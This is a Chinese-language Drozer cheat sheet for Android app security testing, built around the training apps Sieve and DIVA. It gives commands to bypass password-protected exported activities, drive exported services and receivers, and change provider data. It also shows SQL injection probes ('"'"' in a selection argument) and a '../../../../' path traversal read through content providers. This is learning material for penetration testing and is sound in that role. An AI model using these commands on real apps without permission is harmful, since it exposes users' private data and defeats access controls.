---
title: Drozer Cheat Sheet
tags: [Android, Drozer]

category: "Tools/Others/Android Related/Drozer"
---

# Drozer Cheat Sheet

## Basic Console
基本上最常用的command就是
```bash!
dz> run <drozer module> <optional object> # 啟動內建的module做到依稀操作
dz> help <drozer module> # 查看該module的說明以及參數設定
```

```bash!
dz> run app.package.list #列出所有已安裝的app package
dz> run app.package.list -f <key word> #列出特定的app package 
dz> run app.package.info -a <app package name> # 列出該app的基本訊息
dz> run app.package.manifest <app package name e.g. jakhar.aseem.diva> # 查看AndroidManifest.xml的資訊
dz> run app.package.attacksurface <app package name e.g. com.mwr.example.sieve> # 查看該app有什麼攻擊面
Attack Surface:
    3 activities exported # 也許可以啟動一個activity並且bypass某種應該阻止我啟動他的權限
    0 broadcast receivers exported
    2 content providers exported # 也許可以fetch private data或是利用某些漏洞 e.g. sqli or path traversal
    2 services exported
        is debuggable
```
接著根據得到的資訊看要用以下哪一種的攻擊模式

### activities exported
如果確定該app的AndroidManifest.xml有設定==android:export="true"==，就代表有機會bypass他的權限，根據[^csdn-androidmanifest-xml]這個地方的風險如下:
> android:exported
> 這個屬性用於指示該服務是否能夠被其他應用程序組件call或跟它interact。如果設置為true，則callable或interactable，否則不能。設置為false時，只有同一個應用程序的組件或帶有相同用戶ID的應用程序才能啟動或綁定該服務。
1. 列出export activities有哪些
    ```bash!
    dz> run app.activity.info -a <app package name>
    ```
2. 啟動activity
    ```bash!
    dz> run app.activity.start --component <app package name> <activity name fetched by above command>
    ```
    此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass
    ![Screenshot_20240603-163856](https://hackmd.io/_uploads/rkrr-ZsNA.png =200x)

### services exported
和上面的問題差不多，只是差在被export的是services
1. 列出export services有哪些
    ```bash!
    dz> run app.service.info -a <app package nam>
    ```
2. 與該services互動
    這邊就不是像上一個activity一樣是啟動，而是要和他互動，因為service本來就是一個運行在背景的服務，他沒有畫面，無法和一般使用者互動，會需要的module如下
    ```
    app.service.send            Send a Message to a service, and display the reply
    app.service.start           Start Service
    app.service.stop            Stop Service
    ```
    如果去看`app.service.send`該如何使用，可以直接看範例就好，簡單來說我們可以丟給service一連串東西，就看逆向之後該service怎麼寫，如果參數不夠，可以用`--extra`去包後面的參數
    ```bash
        dz> run app.service.send com.example.srv com.example.srv.Service --msg 1 2 3 --extra float value 0.1324 --extra string test value
        Got a reply from com.example.srv/com.example.srv.Service:
          what: 1
          arg1: 2
          arg2: 3
        Data:
          value (float) : 0.1324
          test (string) : value
    ```

### broadcast receivers exported
根據[^pixnet-android-broadcast]的說明，broadcast屬於process之間的通訊，根據教學:
> 發現這些廣播接收器後，您應該檢查它們的代碼。特別注意**onReceive**函數，因為它將處理接收到的消息。

1. 檢測broadcast receiver
    ```bash
    dz> run app.broadcast.info # 檢測所有broadcast receiver
    dz> run app.broadcast.info -a <app package name> # 檢查特定app內的broadcast receiver
    ```
2. 和前面的exported service一樣，我們要和他們互動，但至於要傳送什麼也是要透過逆向來後來判斷
    ```bash
    app.broadcast.info          Get information about broadcast receivers
    app.broadcast.send          Send broadcast using an intent
    app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents
    ```
    根據help的提示如下，可以知道該如何使用send→Sends an intent to broadcast receivers.
    ```bash
    dz> run app.broadcast.send --action <action name fetch by AndroidManifest.xml> --component <path to the function name> <function name>
    ```
    ```bash
    Examples:
    Attempt to send the BOOT_COMPLETED broadcast message:
        dz> run app.broadcast.send --action android.intent.action.BOOT_COMPLETED
        java.lang.SecurityException: Permission Denial: not allowed to send broadcast
    android.intent.action.BOOT_COMPLETED from pid=955, uid=10044
    ```

### content providers exported
1. 檢查Content Provider的exported狀況
    ```bash
    dz> run app.provider.info -a <app package name>
    
    # Drozer可以猜測並嘗試多個URI，這樣我們才知道確切的URI長怎樣
    dz> run scanner.provider.finduris -a <app package name>
    ```
2. 利用逆向判斷他是基於database還是基於file system的Content Provider
    * 基於DataBase
        ```bash
        #1. 查詢內容
        dz> run app.provider.query <URI> [--projection [columns ...]] [--selection conditions] [--selection-args [arg ...]] [--order by_column] [--vertical]
        
        #2. 插入內容
        dz> run app.provider.insert <URI> [--string key value] [--double key value] [--float key value] [--integer key value] [--long key value] [--short key value] [--boolean key value]
        
        #3. 更新內容
        #總而言之就是要選擇更新的地方，和要更新的內容為何
        #selection參數有點像是一般常見的"WHERE <conditions>"
        dz> run app.provider.update <URI> --selection <指定是哪一個欄位, format: "column name=?"> --selection-args <用來取代前面selection的問號，可以不只一個> [--string key value] [--double key value] [--float key value] [--integer key value] [--long key value] [--short key value] [--boolean key value]
        
        #4. 刪除內容
        #幾乎和前面一樣，也就是要指定刪除的位置
        dz> run app.provider.delete <URI> --selection <指定是哪一個欄位, format: "column name=?"> --selection-args <用來取代前面selection的問號，可以不只一個> 
        
        #5. SQLi
        #這邊是利用query來達到sqli，利用--selection和--projection這兩個參數，
        #projection這個參數，原文的解釋: 
        #the columns to SELECT from the database, as in "SELECT <projection> FROM ..."
        dz> run app.provider.query <URI> --selection "'"
        dz> run app.provider.query <URI> --projection "*
        
        #6. Drozer自動發現SQLi
        dz> run scanner.provider.injection -a <app package name>
        dz> run scanner.provider.sqltables -a <app package name>
        ```
    * 基於File System
        ```bash
        #1. 讀取文件
        dz> run app.provider.read <URI+path>
        
        #2. Path Traversal
        dz> run app.provider.read <URI+../../../../+path>
        
        #3. Drozer自動發現Path Traversal
        dz> run scanner.provider.traversal -a <app package name>
        
        #4. Download File to Local
        run app.provider.download <URI+path> hosts
        ```

### is debuggable
可以直接用drozer找，或者是直接看AndroidManifest.xml中有無提到==debuggable="true"==
```bash
# 找到所有debuggable的app
dz> run app.package.debuggable
```